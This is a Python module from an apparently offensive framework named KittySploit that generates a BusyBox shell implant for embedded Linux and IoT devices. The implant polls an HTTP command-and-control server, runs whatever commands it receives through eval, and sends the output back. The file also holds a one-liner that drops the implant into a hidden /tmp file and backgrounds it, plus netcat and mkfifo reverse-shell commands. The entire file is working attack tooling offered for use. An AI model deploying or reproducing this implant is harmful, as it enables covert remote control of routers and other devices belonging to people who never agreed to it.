#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""BusyBox / ash HTTP polling agent for embedded Linux (OpenWrt, IoT).

Pairs with ``listeners/multi/reverse_http_polling`` using the legacy base64
command protocol (no Python / no implant signature required).
"""

from __future__ import annotations


_AGENT_TEMPLATE = r"""#!/bin/sh
# KittySploit embedded HTTP polling agent (BusyBox/ash)
HOST="__HOST__"
PORT="__PORT__"
CID="__CID__"
PREFIX="__PREFIX__"
POLL="__POLL__"
UA="__UA__"
SCHEME="__SCHEME__"
BASE="${SCHEME}://${HOST}"
[ "$PORT" = "80" ] || [ "$PORT" = "443" ] || BASE="$BASE:$PORT"

_http_get() {
  URL="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -sk -A "$UA" --connect-timeout 15 --max-time 45 "$URL" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O- -U "$UA" --timeout=45 "$URL" 2>/dev/null
  elif command -v uclient-fetch >/dev/null 2>&1; then
    uclient-fetch -q -O- -T 45 "$URL" 2>/dev/null
  else
    return 1
  fi
}

_http_post() {
  URL="$1"
  BODY="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -sk -A "$UA" -H "Content-Type: application/json" --connect-timeout 15 --max-time 45 -d "$BODY" "$URL" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O- -U "$UA" --header="Content-Type: application/json" --post-data="$BODY" --timeout=45 "$URL" 2>/dev/null
  else
    return 1
  fi
}

_b64d() {
  if command -v base64 >/dev/null 2>&1; then
    printf '%s' "$1" | base64 -d 2>/dev/null
  elif command -v openssl >/dev/null 2>&1; then
    printf '%s' "$1" | openssl base64 -d -A 2>/dev/null
  else
    printf '%s' "$1"
  fi
}

_b64e() {
  if command -v base64 >/dev/null 2>&1; then
    printf '%s' "$1" | base64 | tr -d '\n\r'
  elif command -v openssl >/dev/null 2>&1; then
    printf '%s' "$1" | openssl base64 -A 2>/dev/null | tr -d '\n\r'
  else
    printf '%s' "$1"
  fi
}

_json_field() {
  printf '%s' "$1" | sed -n 's/.*"'"$2"'"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1
}

_has_die() {
  printf '%s' "$1" | grep -q '"die"[[:space:]]*:[[:space:]]*true'
}

_run() {
  CMD="$1"
  OUT=$(eval "$CMD" 2>&1)
  RC=$?
  [ -n "$OUT" ] || OUT="[exit $RC]"
  printf '%s' "$OUT"
}

while :; do
  Q="id=$CID"
  RAW=$(_http_get "$BASE$PREFIX/poll?$Q") || { sleep "$POLL"; continue; }
  [ -n "$RAW" ] || { sleep "$POLL"; continue; }
  if _has_die "$RAW"; then
    exit 0
  fi
  ENC=$(_json_field "$RAW" encoding)
  CMD=$(_json_field "$RAW" command)
  if [ -n "$CMD" ]; then
    if [ "$ENC" = "base64" ]; then
      CMD=$(_b64d "$CMD")
    fi
    case "$CMD" in
      \{*) CMD="" ;;
    esac
    if [ -n "$CMD" ]; then
      OUT=$(_run "$CMD")
      OUTB=$(_b64e "$OUT")
      BODY="{\"output\":\"$OUTB\",\"encoding\":\"base64\",\"id\":\"$CID\"}"
      _http_post "$BASE$PREFIX/result?$Q" "$BODY" >/dev/null 2>&1
    fi
  fi
  NS=$(_json_field "$RAW" next_sleep)
  case "$NS" in
    ''|*[!0-9.]*) sleep "$POLL" ;;
    *) sleep "$NS" 2>/dev/null || sleep "$POLL" ;;
  esac
done
"""


def build_embedded_http_agent_script(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: float = 10.0,
    use_ssl: bool = False,
    user_agent: str = "BusyBox-KS/1.0",
) -> str:
    """Return a POSIX ``sh`` implant using curl / wget / uclient-fetch."""
    scheme = "https" if use_ssl else "http"
    prefix = "/" + str(url_prefix or "/c2").strip("/")
    host_s = str(host).strip().replace('"', "")
    port_i = int(port)
    cid = str(client_id).strip().replace('"', "") or "emb-agent"
    poll = max(2, int(float(poll_interval) or 10))
    ua = str(user_agent or "BusyBox-KS/1.0").replace('"', "")
    return (
        _AGENT_TEMPLATE.replace("__HOST__", host_s)
        .replace("__PORT__", str(port_i))
        .replace("__CID__", cid)
        .replace("__PREFIX__", prefix)
        .replace("__POLL__", str(poll))
        .replace("__UA__", ua)
        .replace("__SCHEME__", scheme)
        .strip()
    )


def build_embedded_http_agent_oneliner(
    host: str,
    port: int,
    client_id: str,
    *,
    url_prefix: str = "/c2",
    poll_interval: float = 10.0,
    use_ssl: bool = False,
    path: str = "/tmp/.ks_emb_c2.sh",
) -> str:
    """Write script to ``path`` and background it (BusyBox-friendly)."""
    import base64

    script = build_embedded_http_agent_script(
        host,
        port,
        client_id,
        url_prefix=url_prefix,
        poll_interval=poll_interval,
        use_ssl=use_ssl,
    )
    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
    target = str(path or "/tmp/.ks_emb_c2.sh").replace("'", "")
    return (
        f"F='{target}'; "
        f"echo {encoded} | base64 -d > \"$F\" 2>/dev/null || "
        f"echo {encoded} | openssl base64 -d -A > \"$F\"; "
        f"chmod +x \"$F\"; "
        f"(nohup sh \"$F\" >/dev/null 2>&1 &)"
    )


def build_embedded_reverse_tcp_fallback(host: str, port: int, shell: str = "sh") -> str:
    """One-shot BusyBox reverse TCP (non-polling) for constrained devices."""
    h = str(host).strip()
    p = int(port)
    sh = str(shell or "sh").strip() or "sh"
    return (
        f"busybox nc {h} {p} -e {sh} 2>/dev/null || "
        f"nc {h} {p} -e {sh} 2>/dev/null || "
        f"rm -f /tmp/.ks_f;mkfifo /tmp/.ks_f;cat /tmp/.ks_f|{sh} -i 2>&1|nc {h} {p} >/tmp/.ks_f"
    )
